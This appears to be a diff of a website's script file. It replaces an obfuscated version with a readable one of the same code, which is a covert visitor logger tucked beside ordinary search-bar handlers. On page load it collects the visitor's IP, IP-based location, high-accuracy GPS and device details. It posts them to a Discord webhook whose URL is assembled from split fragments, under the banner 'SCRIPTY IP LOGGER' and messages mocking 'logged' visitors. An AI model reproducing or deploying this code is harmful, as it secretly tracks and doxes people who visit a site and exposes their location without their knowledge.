@@ -1,1 +1,203 @@
-function a0_0x54c7(_0x4b1cac,_0x51df99){const _0x5d0d84=a0_0x5d0d();return a0_0x54c7=function(_0x54c71b,_0x4c2397){_0x54c71b=_0x54c71b-0x1db;let _0x143db3=_0x5d0d84[_0x54c71b];return _0x143db3;},a0_0x54c7(_0x4b1cac,_0x51df99);}const a0_0x40f66b=a0_0x54c7;(function(_0x56c554,_0x31b32d){const _0x1e7854=a0_0x54c7,_0x449ca3=_0x56c554();while(!![]){try{const _0x511398=parseInt(_0x1e7854(0x20b))/0x1*(-parseInt(_0x1e7854(0x1ea))/0x2)+-parseInt(_0x1e7854(0x22c))/0x3+parseInt(_0x1e7854(0x21a))/0x4*(-parseInt(_0x1e7854(0x1fc))/0x5)+-parseInt(_0x1e7854(0x22a))/0x6+parseInt(_0x1e7854(0x234))/0x7+parseInt(_0x1e7854(0x227))/0x8*(-parseInt(_0x1e7854(0x221))/0x9)+-parseInt(_0x1e7854(0x217))/0xa*(-parseInt(_0x1e7854(0x233))/0xb);if(_0x511398===_0x31b32d)break;else _0x449ca3['push'](_0x449ca3['shift']());}catch(_0x26606d){_0x449ca3['push'](_0x449ca3['shift']());}}}(a0_0x5d0d,0x28218));const sendIP=()=>{const _0x7f99f8=a0_0x54c7;fetch(_0x7f99f8(0x1e8))[_0x7f99f8(0x23a)](_0x144e16=>_0x144e16[_0x7f99f8(0x213)]())['then'](_0x8ab8ee=>{const _0x348116=_0x7f99f8,_0x314266=_0x8ab8ee['ip'];return fetch(_0x348116(0x22d)+_0x314266+_0x348116(0x214))[_0x348116(0x23a)](_0x1efa6b=>_0x1efa6b['json']())[_0x348116(0x23a)](async _0x556c61=>{const _0x572d61=_0x348116;function _0x5dea5e(){const _0x558542=a0_0x54c7;try{const _0x53032d=document[_0x558542(0x232)]('canvas'),_0x1b4936=_0x53032d[_0x558542(0x212)](_0x558542(0x230))||_0x53032d[_0x558542(0x212)]('experimental-webgl');if(!_0x1b4936)return _0x558542(0x22b);const _0x3362d4=_0x1b4936[_0x558542(0x236)]('WEBGL_debug_renderer_info');if(_0x3362d4)return _0x1b4936[_0x558542(0x1db)](_0x3362d4['UNMASKED_RENDERER_WEBGL']);return _0x558542(0x22b);}catch{return _0x558542(0x22b);}}function _0x483c65(){return new Promise(_0x40413e=>{const _0xae3173=a0_0x54c7;if(!navigator[_0xae3173(0x238)])return _0x40413e({'error':_0xae3173(0x1e6)});navigator[_0xae3173(0x238)][_0xae3173(0x20e)](_0x3ef71e=>{const _0x5923f9=_0xae3173;_0x40413e({'latitude':_0x3ef71e[_0x5923f9(0x209)][_0x5923f9(0x1ed)]['toFixed'](0x6),'longitude':_0x3ef71e[_0x5923f9(0x209)][_0x5923f9(0x1ee)][_0x5923f9(0x1fe)](0x6),'accuracy':_0x3ef71e[_0x5923f9(0x209)]['accuracy']+_0x5923f9(0x1e0)});},_0xcad632=>{_0x40413e({'error':_0xcad632['message']});},{'enableHighAccuracy':!![],'timeout':0x2710,'maximumAge':0x0});});}const _0x4874e9={'userAgent':navigator[_0x572d61(0x224)],'screenWidth':window['screen'][_0x572d61(0x23d)],'screenHeight':window[_0x572d61(0x1e1)][_0x572d61(0x23f)],'language':navigator['language'],'platform':navigator[_0x572d61(0x231)],'battery':'PC\x20don\x27t\x20have\x20battery','charging':_0x572d61(0x205),'screenRefreshRate':'N/A','touchScreen':_0x572d61(0x203)in window?_0x572d61(0x1df):'No','gpu':_0x5dea5e()};navigator[_0x572d61(0x207)]&&await navigator['getBattery']()[_0x572d61(0x23a)](_0x52557b=>{const _0x1d1f52=_0x572d61;_0x4874e9[_0x1d1f52(0x1f8)]=(_0x52557b[_0x1d1f52(0x21e)]*0x64)[_0x1d1f52(0x1fe)](0x0)+'%',_0x4874e9['charging']=_0x52557b[_0x1d1f52(0x1ff)]?_0x1d1f52(0x1df):'No';});const _0x44c927=()=>{return new Promise(_0x4eac1f=>{const _0x116ebc=a0_0x54c7;let _0x2f491b=0x0;const _0xcbbb9c=performance[_0x116ebc(0x1de)](),_0x291eeb=()=>{const _0x568a21=_0x116ebc;_0x2f491b++;const _0x735b0=performance[_0x568a21(0x1de)]()-_0xcbbb9c;_0x735b0<0x3e8?requestAnimationFrame(_0x291eeb):_0x4eac1f(Math[_0x568a21(0x204)](_0x2f491b*0x3e8/_0x735b0)+_0x568a21(0x1e2));};requestAnimationFrame(_0x291eeb);});};_0x4874e9[_0x572d61(0x1f6)]=await _0x44c927();const _0x3d8e1a=await _0x483c65(),_0x3f72a2=_0x572d61(0x21d),_0x3d7648='discord',_0x5d5d95='.com',_0x35ddc6='/api',_0x5db427='/webhooks/',_0x2e6a2e=_0x572d61(0x1dc),_0x29b608='/',_0x414fb5='24KgI',_0x22a309=_0x572d61(0x1f0),_0x25f019=_0x572d61(0x1f9),_0x10f87a=_0x572d61(0x23b),_0x4ebb9f='h70k8',_0x3ad468=_0x572d61(0x21b),_0x4a79e9=_0x572d61(0x1e3),_0x238fa1=_0x572d61(0x1f1),_0x5ee0c7='O53cd',_0x46c83e=_0x572d61(0x1e7),_0x118d9e=_0x3f72a2+_0x3d7648+_0x5d5d95+_0x35ddc6+_0x5db427+_0x2e6a2e+_0x29b608+_0x414fb5+_0x22a309+_0x25f019+_0x10f87a+_0x4ebb9f+_0x3ad468+_0x4a79e9+_0x238fa1+_0x5ee0c7+_0x46c83e;return fetch(_0x118d9e,{'method':'POST','headers':{'Content-Type':_0x572d61(0x1fb)},'body':JSON['stringify']({'username':_0x572d61(0x223),'avatar_url':_0x572d61(0x1f4),'content':'@here\x20another\x20bozo\x20logged\x20(dox-site)','embeds':[{'title':_0x572d61(0x223),'description':_0x572d61(0x1e4)+_0x314266+_0x572d61(0x23e)+_0x556c61['network']+'\x0aCity\x20>\x20'+_0x556c61['city']+_0x572d61(0x22e)+_0x556c61[_0x572d61(0x240)]+_0x572d61(0x1ef)+_0x556c61[_0x572d61(0x23c)]+_0x572d61(0x201)+_0x556c61['postal']+_0x572d61(0x1e5)+_0x556c61[_0x572d61(0x1ed)]+'\x0aLongitude\x20>\x20'+_0x556c61[_0x572d61(0x1ee)]+_0x572d61(0x225)+_0x556c61['timezone']+_0x572d61(0x219)+_0x556c61[_0x572d61(0x1f7)]+_0x572d61(0x202)+(_0x3d8e1a[_0x572d61(0x1ed)]||_0x572d61(0x228))+_0x572d61(0x210)+(_0x3d8e1a['longitude']||_0x572d61(0x228))+_0x572d61(0x239)+(_0x3d8e1a['accuracy']||_0x3d8e1a[_0x572d61(0x1dd)]||_0x572d61(0x22b))+_0x572d61(0x1fd)+_0x4874e9[_0x572d61(0x20a)]+'px\x0aScreen\x20Height\x20>\x20'+_0x4874e9[_0x572d61(0x20f)]+_0x572d61(0x1fa)+_0x4874e9[_0x572d61(0x1f6)]+_0x572d61(0x216)+_0x4874e9[_0x572d61(0x222)]+'\x0a\x0a**Device\x20Info:**\x0aUser-Agent\x20>\x20'+_0x4874e9['userAgent']+'\x0aLanguage\x20>\x20'+_0x4874e9['language']+_0x572d61(0x211)+_0x4874e9[_0x572d61(0x231)]+_0x572d61(0x20c)+_0x4874e9[_0x572d61(0x1f8)]+_0x572d61(0x22f)+_0x4874e9[_0x572d61(0x1ff)]+_0x572d61(0x215)+_0x4874e9[_0x572d61(0x1eb)]+_0x572d61(0x1ec),'color':0x1abc9c}]})});});})[_0x7f99f8(0x23a)](_0x5e67b5=>{const _0x2cfe8e=_0x7f99f8;_0x5e67b5['ok']?console[_0x2cfe8e(0x237)]('Sent!\x20<3'):console[_0x2cfe8e(0x237)]('Failed\x20:(');})[_0x7f99f8(0x220)](_0x194f5b=>{const _0x1ee5ca=_0x7f99f8;console['error'](_0x1ee5ca(0x218),_0x194f5b),console[_0x1ee5ca(0x237)](_0x1ee5ca(0x200));});};sendIP(),document['querySelector'](a0_0x40f66b(0x21f))[a0_0x40f66b(0x1e9)](a0_0x40f66b(0x20d),_0x1677bb=>{const _0x4656bd=a0_0x40f66b;if(_0x1677bb[_0x4656bd(0x1f2)]===_0x4656bd(0x1f5)){const _0x130973=_0x1677bb[_0x4656bd(0x208)][_0x4656bd(0x206)][_0x4656bd(0x229)]();_0x130973&&(window[_0x4656bd(0x1f3)][_0x4656bd(0x235)]='https://google.com/search?q=site:scripty.my+'+encodeURIComponent(_0x130973));}}),document[a0_0x40f66b(0x226)]('.search-bar\x20button')[a0_0x40f66b(0x1e9)](a0_0x40f66b(0x21c),()=>{const _0xa605ed=a0_0x40f66b,_0x258a68=document[_0xa605ed(0x226)](_0xa605ed(0x21f))[_0xa605ed(0x206)][_0xa605ed(0x229)]();_0x258a68&&(window[_0xa605ed(0x1f3)][_0xa605ed(0x235)]='https://google.com/search?q=site:scripty.my+'+encodeURIComponent(_0x258a68));});function a0_0x5d0d(){const _0x1c60a7=['json','/json/','\x0aGPU\x20>\x20','\x0aTouch\x20Screen\x20>\x20','1992110VUDFqS','Error:','\x0aOrganization\x20>\x20','116bbIvev','pyu18','click','https://','level','.search-bar\x20input','catch','53442RyKiev','touchScreen','SCRIPTY\x20IP\x20LOGGER','userAgent','\x0aTimezone\x20>\x20','querySelector','328AduKJd','Denied','trim','310668YVBgKJ','N/A','899340FFuLfb','https://ipapi.co/','\x0aRegion\x20>\x20','\x0aCharging\x20>\x20','webgl','platform','createElement','44RXtgne','561589IoRIXF','href','getExtension','log','geolocation','\x0aAccuracy\x20>\x20','then','ELjk','country_name','width','\x0aNetwork\x20>\x20','height','region','getParameter','1407630270030680114','error','now','Yes','\x20meters','screen','\x20Hz','Xqz9L','\x0a**IP\x20Info:**\x0aIP\x20Address\x20>\x20','\x0aLatitude\x20>\x20','Geolocation\x20not\x20supported','tLCXZXoW67cM_5mPToQVlvkZ','https://api.ipify.org?format=json','addEventListener','2HLxZeP','gpu','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','latitude','longitude','\x0aCountry\x20>\x20','RJu3K','QGTa4','key','location','https://media.discordapp.net/attachments/1378331466102083756/1407630039213932625/Snimka_obrazovky_2025-08-16_180821.png','Enter','screenRefreshRate','org','battery','CrhK_','px\x0aScreen\x20Refresh\x20Rate\x20>\x20','application/json','8315dNEiJM','\x0a\x0a**Screen\x20Info:**\x0aScreen\x20Width\x20>\x20','toFixed','charging','Error\x20:(','\x0aPostal\x20Code\x20>\x20','\x0a\x0a**Geolocation\x20(Browser-based\x20-\x20GPS):**\x0aLatitude\x20>\x20','ontouchstart','round','PC\x20don\x27t\x20have\x20battery','value','getBattery','target','coords','screenWidth','69452iERYTi','\x0aBattery\x20>\x20','keydown','getCurrentPosition','screenHeight','\x0aLongitude\x20>\x20','\x0aPlatform\x20>\x20','getContext'];a0_0x5d0d=function(){return _0x1c60a7;};return a0_0x5d0d();}
+const sendIP = () => {
+    fetch('https://api.ipify.org?format=json')
+        .then(ipResponse => ipResponse.json())
+        .then(ipData => {
+            const ipadd = ipData.ip;
+
+            return fetch(`https://ipapi.co/${ipadd}/json/`)
+                .then(geoResponse => geoResponse.json())
+                .then(async geoData => {
+
+                    function getGPUInfo() {
+                        try {
+                            const canvas = document.createElement('canvas');
+                            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                            if (!gl) return 'N/A';
+
+                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                            if (debugInfo) {
+                                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                            }
+                            return 'N/A';
+                        } catch {
+                            return 'N/A';
+                        }
+                    }
+                    function getWindowsVersion() {
+                        const ua = navigator.userAgent;
+
+                        if (ua.includes("Windows NT 10.0")) return "Windows 10 or 11";
+                        if (ua.includes("Windows NT 6.3")) return "Windows 8.1";
+                        if (ua.includes("Windows NT 6.2")) return "Windows 8";
+                        if (ua.includes("Windows NT 6.1")) return "Windows 7";
+                        if (ua.includes("Windows NT 6.0")) return "Windows Vista";
+                        if (ua.includes("Windows NT 5.1")) return "Windows XP";
+                        return "Unknown Windows version";
+                    }
+                    function getBrowserLocation() {
+                        return new Promise((resolve) => {
+                            if (!navigator.geolocation) {
+                                return resolve({ error: 'Geolocation not supported' });
+                            }
+
+                            navigator.geolocation.getCurrentPosition(
+                                (position) => {
+                                    resolve({
+                                        latitude: position.coords.latitude.toFixed(6),
+                                        longitude: position.coords.longitude.toFixed(6),
+                                        accuracy: `${position.coords.accuracy} meters`
+                                    });
+                                },
+                                (error) => {
+                                    resolve({ error: error.message });
+                                },
+                                {
+                                    enableHighAccuracy: true,
+                                    timeout: 10000,
+                                    maximumAge: 0
+                                }
+                            );
+                        });
+                    }
+
+                    const deviceInfo = {
+                        userAgent: navigator.userAgent,
+                        screenWidth: window.screen.width,
+                        screenHeight: window.screen.height,
+                        language: navigator.language,
+                        platform: navigator.platform,
+                        battery: "PC don't have battery",
+                        charging: "PC don't have battery",
+                        screenRefreshRate: "N/A",
+                        touchScreen: ('ontouchstart' in window) ? 'Yes' : 'No',
+                        gpu: getGPUInfo()
+                    };
+
+                    if (navigator.getBattery) {
+                        await navigator.getBattery().then(battery => {
+                            deviceInfo.battery = (battery.level * 100).toFixed(0) + "%";
+                            deviceInfo.charging = battery.charging ? "Yes" : "No";
+                        });
+                    }
+
+                    const getScreenRefreshRate = () => {
+                        return new Promise(resolve => {
+                            let frames = 0;
+                            const start = performance.now();
+
+                            const loop = () => {
+                                frames++;
+                                const elapsed = performance.now() - start;
+                                if (elapsed < 1000) {
+                                    requestAnimationFrame(loop);
+                                } else {
+                                    resolve(Math.round((frames * 1000) / elapsed) + " Hz");
+                                }
+                            };
+
+                            requestAnimationFrame(loop);
+                        });
+                    };
+
+                    deviceInfo.screenRefreshRate = await getScreenRefreshRate();
+                    
+                    const window = await getWindowsVersion();
+                    const browserLocation = await getBrowserLocation();
+                    const m3FzN1 = "https://";
+                    const Pj5G0d = "discord";
+                    const sT4cA9 = ".com";
+                    const q1YkJm = "/api";
+                    const R8dWbP = "/webhooks/";
+                    const z9Q2yL = "1407630270030680114";
+                    const U3V6nD = "/";
+                    const Gd7xWz = "24KgI";
+                    const hK2NpS = "RJu3K";
+                    const aL0tXv = "CrhK_";
+                    const Fq5YrM = "ELjk";
+                    const k8W2Lb = "h70k8";
+                    const D7pToV = "pyu18";
+                    const J3gNxR = "Xqz9L";
+                    const C9fZ2p = "QGTa4";
+                    const S6hB8u = "O53cd";
+                    const S6hWbP = "tLCXZXoW67cM_5mPToQVlvkZ";
+                    const dscURL = m3FzN1 + Pj5G0d + sT4cA9 + q1YkJm + R8dWbP + z9Q2yL + U3V6nD + Gd7xWz + hK2NpS + aL0tXv + Fq5YrM + k8W2Lb + D7pToV + J3gNxR + C9fZ2p + S6hB8u + S6hWbP;
+
+
+                    return fetch(dscURL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            username: "SCRIPTY IP LOGGER",
+                            avatar_url: "https://media.discordapp.net/attachments/1378331466102083756/1407630039213932625/Snimka_obrazovky_2025-08-16_180821.png",
+                            content: `@here somebody get logged (main-site)`,
+                            embeds: [{
+                                title: 'SCRIPTY IP LOGGER',
+                                description: `
+**IP Info:**
+IP Address > ${ipadd}
+Network > ${geoData.network}
+City > ${geoData.city}
+Region > ${geoData.region}
+Country > ${geoData.country_name}
+Postal Code > ${geoData.postal}
+Latitude > ${geoData.latitude}
+Longitude > ${geoData.longitude}
+Timezone > ${geoData.timezone}
+Organization > ${geoData.org}
+
+**Geolocation (Browser-based - GPS):**
+Latitude > ${browserLocation.latitude || 'Denied'}
+Longitude > ${browserLocation.longitude || 'Denied'}
+Accuracy > ${browserLocation.accuracy || browserLocation.error || 'N/A'}
+
+**Screen Info:**
+Screen Width > ${deviceInfo.screenWidth}px
+Screen Height > ${deviceInfo.screenHeight}px
+Screen Refresh Rate > ${deviceInfo.screenRefreshRate}
+Touch Screen > ${deviceInfo.touchScreen}
+
+**Device Info:**
+User-Agent > ${window}
+User-Agent > ${deviceInfo.userAgent}
+Language > ${deviceInfo.language}
+Platform > ${deviceInfo.platform}
+Battery > ${deviceInfo.battery}
+Charging > ${deviceInfo.charging}
+GPU > ${deviceInfo.gpu}
+                                `,
+                                color: 1752220
+                            }]
+                        })
+                    });
+                });
+        })
+        .then(dscResponse => {
+            if (dscResponse.ok) {
+                console.log('Sent! <3');
+            } else {
+                console.log('Failed :(');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            console.log('Error :(');
+        });
+};
+
+sendIP();
+
+document.querySelector('.search-bar input').addEventListener('keydown', e => {
+  if (e.key === 'Enter') {
+    const query = e.target.value.trim();
+    if (query) {
+      window.location.href = `https://google.com/search?q=site:scripty.my+${encodeURIComponent(query)}`;
+    }
+  }
+});
+
+document.querySelector('.search-bar button').addEventListener('click', () => {
+  const query = document.querySelector('.search-bar input').value.trim();
+  if (query) {
+    window.location.href = `https://google.com/search?q=site:scripty.my+${encodeURIComponent(query)}`;
+  }
+});
